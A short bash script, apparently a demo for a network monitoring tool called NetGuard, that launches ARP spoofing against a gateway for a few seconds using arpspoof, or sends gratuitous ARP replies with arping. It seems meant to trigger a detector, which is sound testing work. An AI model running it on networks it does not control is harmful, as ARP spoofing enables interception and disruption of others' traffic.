#!/bin/bash
# NetGuard Demo — ARP Spoofing Attack
# Sends gratuitous ARP replies with conflicting MAC addresses
# Usage: ./attack_arp.sh [GATEWAY_IP] [INTERFACE]
# Requires: arpspoof (dsniff package) or arping

GATEWAY="${1:-192.168.1.1}"
IFACE="${2:-eth0}"

echo "[*] Launching ARP spoofing against gateway $GATEWAY on $IFACE..."

if command -v arpspoof &>/dev/null; then
  timeout 10 arpspoof -i "$IFACE" "$GATEWAY" &
  sleep 5
  kill %1 2>/dev/null
else
  echo "[!] arpspoof not found. Using arping simulation..."
  arping -c 5 -A -I "$IFACE" "$GATEWAY" 2>/dev/null || \
    echo "[!] arping not available. Install dsniff: sudo apt install dsniff"
fi

echo "[+] ARP spoofing simulation complete."
